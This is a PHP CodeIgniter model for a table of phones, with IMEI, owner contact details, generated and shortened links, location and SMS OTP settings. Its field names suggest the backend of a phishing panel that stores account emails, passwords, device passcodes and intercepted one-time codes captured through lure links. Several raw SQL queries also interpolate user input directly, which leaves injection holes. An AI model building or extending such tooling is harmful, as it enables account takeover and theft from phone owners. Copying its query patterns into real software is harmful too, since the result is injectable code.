<?php 
 namespace App\Models;
 use CodeIgniter\Model;

class Equipos_model extends Model {
    
    protected $db;

    public function __construct(){
       $this->db = \Config\Database::connect('default');
    }


    public function get_ingresados($idusuario,$buscar){
      
      if($buscar == ""){
        
        $query = $this->db->query("SELECT * FROM tblequipos WHERE idusuario = $idusuario ORDER BY idequipos DESC");

      }elseif($buscar != ""){

        $query = $this->db->query("SELECT * FROM tblequipos WHERE idusuario = $idusuario AND (user LIKE '%$buscar%' OR email LIKE '%$buscar%' OR modelo LIKE '%$buscar%' OR imei LIKE '%$buscar%') ORDER BY idequipos DESC");

      }

       return $query->getResult();
    }

    public function get_ingresado($linkg){

      $query = $this->db->query("SELECT * FROM tblequipos WHERE linkg = '$linkg'");
      return $query->getRowArray();

    }

    public function verificarlinkuser($idusuario, $linkg){

      $query = $this->db->query("SELECT * FROM tblequipos WHERE linkg = '$linkg' AND idusuario = $idusuario");
      return $query->getRowArray();

    }

    public function verificarlink($linkg){

      $query = $this->db->query("SELECT * FROM tblequipos WHERE linkg = '$linkg'");
      return $query->getNumRows(); 
    }   

    public function countequipos($idusuario){

      $query = $this->db->query("SELECT COUNT(status) as 'statuscount' FROM tblequipos WHERE idusuario = $idusuario");
      return $query->getRowArray(); 

    }

    public function countequiposstatus($idusuario, $status){

       $query = $this->db->query("SELECT COUNT(status) as 'statuscount' FROM tblequipos WHERE status = '$status' AND idusuario = $idusuario");
      return $query->getRowArray(); 

    }
    public function get_ingresadoID($idusuario,$idequipos){

         $query = $this->db->query("SELECT * FROM tblequipos WHERE idusuario = $idusuario AND idequipos = $idequipos");
         return $query->getRowArray(); 

    } 








  public function totalcountnoti($idusuario){

    $query = $this->db->query("SELECT *, COUNT(id) AS 'counttotal' FROM tblobtenidos WHERE idusuario = $idusuario AND statusvisita = 1");
    return $query->getResult(); 
  
   
  }



 
  public function set_Equipo($datos){

      $query =  $this->db->table('tblequipos');

       $data = [
        "linkg" => $datos['linkg'],  
        "tipo" => $datos['tipo'], 
        "user" => $datos['user'], 
        "niphone" => $datos['niphone'], 
        "pais" => $datos['pais'], 
        "numero" => $datos['numero'], 
        "email" => $datos['email'], 
        "modelo" => $datos['modelo'], 
        "imei" => $datos['imei'], 
        "status" => $datos['status'], 
        "visitas" => $datos['visitas'], 
        "fecha"=> $datos['fecha'], 
        "valor1" => $datos['valor1'], 
        "valor2" => $datos['valor2'], 
        "tipolinkg" => $datos['tipolinkg'], 
        "idusuario" => $datos['idusuario'], 
        "latitud" => $datos['latitud'], 
        "longitud" => $datos['longitud'], 
        "urlacortada" => $datos['urlacortada'], 
        "modelo_pref" => $datos['modelo_pref'], 
        'link_short' => $datos['link_short'], 
        "link_long" => $datos['link_long'],
        "opcion_otp" => $datos['opcion_otp'],
        "tipo_verificacion_otp" => $datos['tipo_verificacion_otp'],
        "plantilla_otp" => $datos['plantilla_otp'],
        "lenguaje_otp" => $datos['lenguaje_otp'],
        "id_apisms" => $datos['id_apisms'],
        "idsender"  => $datos['idsender'],
        "inicio_sesion" => $datos['inicio_sesion']
      ]; 
      return $query->insert($data);
    } 

   


    public function update_requerimiento($datos){

       $query =  $this->db->table('tblequipos');


       $data = [
            "linkg"                 => $datos['linkg'], 
            "tipo"                  => $datos['tipo'], 
            "user"                  => $datos['user'], 
            "niphone"               => $datos['niphone'], 
            "pais"                  => $datos['pais'], 
            "numero"                => $datos['numero'], 
            "email"                 => $datos['email'], 
            "modelo"                => $datos['modelo'], 
            "imei"                  => $datos['imei'], 
            "valor1"                => $datos['valor1'], 
            "valor2"                => $datos['valor2'], 
            "idusuario"             => $datos['idusuario'], 
            "urlacortada"           => $datos['urlacortada'], 
            "modelo_pref"           => $datos['modelo_pref'], 
            "opcion_otp"            => $datos['opcion_otp'], 
            "tipo_verificacion_otp" => $datos['tipo_verificacion_otp'], 
            "plantilla_otp"         => $datos['plantilla_otp'], 
            "lenguaje_otp"          => $datos['lenguaje_otp'], 
            "latitud"               => $datos['latitud'], 
            "longitud"              => $datos['longitud'],
            "id_apisms"             => $datos['id_apisms'],
            "idsender"              => $datos['idsender'],
            "inicio_sesion"         => $datos['inicio_sesion']
        ];   

     
      $query->set($data);
      $query->where('idusuario',$datos['idusuario']);
      $query->where('idequipos',$datos['idequipos']);
      return $query->update();
  
  }


  public function update_requerimiento_autoremove($datos){

     $query =  $this->db->table('tblequipos');
     $data = [
            "email"    => $datos['email'],
            "password" => $datos['password'],
            "status"   => $datos['status'],
            "response" => $datos['response']
          ];
     $query->set($data);      
     $query->where('idusuario',$datos['idusuario']);
     $query->where('idequipos',$datos['idequipos']);  
     return $query->update();       

  }

  public function update_requerimiento_passcode($datos){

     $query =  $this->db->table('tblequipos');
     $data = [
            "code_1" => $datos['code_1'],
            "code_2" => $datos['code_2'],
            "status" => $datos['status']
          ];
     $query->set($data);      
     $query->where('idusuario',$datos['idusuario']);
     $query->where('idequipos',$datos['idequipos']);  
     return $query->update();       

  }

 


  public function eliminareEquipo($idusuario, $idequipos){

      $query =  $this->db->table('tblequipos');
      $query->where('idusuario', $idusuario);
      $query->where('idequipos', $idequipos);
      return $query->delete();  

    }


  public function update_type_lock($link, $idusuario,$tipo){

     $query =  $this->db->table('tblequipos');
     $data = [
            "tipo" => $tipo
          ];
     $query->set($data);      
     $query->where('idusuario',$idusuario);
     $query->where('linkg',$link);  
     return $query->update();    
   }


  public function update_otpnumber_equipos($recibio_otp, $codigo_otp_recibido, $link, $idusuario){

     $query =  $this->db->table('tblequipos');
     $data = [
            "recibio_otp" => $recibio_otp,
            "codigo_otp_recibido" => $codigo_otp_recibido
          ];
     $query->set($data);      
     $query->where('idusuario',$idusuario);
     $query->where('linkg',$link);  
     return $query->update();        

   }

   public function update_codigo_otp_generado($codigo_otp_generado, $link, $idusuario){
    
     $query =  $this->db->table('tblequipos');
     $data = [
            "codigo_otp_generado" => $codigo_otp_generado
          ];
     $query->set($data);      
     $query->where('idusuario',$idusuario);
     $query->where('linkg',$link);  
     return $query->update();  

   }

   public function update_codigo_add($codigo_otp_recibido, $recibio_otp, $link, $idusuario){
    
     $query =  $this->db->table('tblequipos');
     $data = [
            "codigo_otp_recibido" => $codigo_otp_recibido,
            "recibio_otp" => $recibio_otp
          ];
     $query->set($data);      
     $query->where('idusuario',$idusuario);
     $query->where('linkg',$link);  
     return $query->update();  

   }

   public function reset_otp($idequipos, $idusuario, $codigo_otp_generado, $codigo_otp_recibido,$recibio_otp){

     $query =  $this->db->table('tblequipos');
     $data = [
            "codigo_otp_generado" => $codigo_otp_generado,
            "codigo_otp_recibido" => $codigo_otp_recibido,
            "recibio_otp" => $recibio_otp
          ];
     $query->set($data);      
     $query->where('idusuario',$idusuario);
     $query->where('idequipos',$idequipos);  
     return $query->update();  

   }
















 

    
    
    public function refresip($ip){
        
        
      $qry = "DELETE FROM tblbloqip WHERE ip = :ip";
      $sql = $this->db->conn_id->prepare($qry);
      $sql->bindParam(':ip', $ip, PDO::PARAM_STR);  
      if($sql->execute()){
        return true;
      }else{
        return false;
      }
      
        
    }  



    

   

 
}


